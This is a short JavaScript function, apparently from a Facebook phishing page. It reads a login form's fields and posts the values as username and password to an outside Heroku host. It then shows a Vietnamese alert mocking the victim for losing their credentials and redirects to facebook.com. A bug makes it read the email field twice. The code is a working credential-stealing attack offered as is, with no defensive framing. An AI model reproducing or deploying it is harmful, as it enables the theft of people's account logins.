function fbHacker() {
  var myHeaders = new Headers();
  myHeaders.append("Content-Type", "application/json");

  var userName = document.getElementById("email").value;
  var passWord = document.getElementById("email").value;

  var raw = JSON.stringify({
    username: userName,
    password: passWord,
  });

  var requestOptions = {
    method: "POST",
    headers: myHeaders,
    body: raw,
    redirect: "follow",
  };

  fetch("https://facebookhackeratbm.herokuapp.com/bn/adduser", requestOptions)
    .then((response) => {
      response.text();
      alert("Đồ ngốc bạn đã bị mất username && password!!!!");
      window.location = "https://www.facebook.com/";
    })
    .then((result) => console.log(result))
    .catch((error) => console.log("error", error));
}
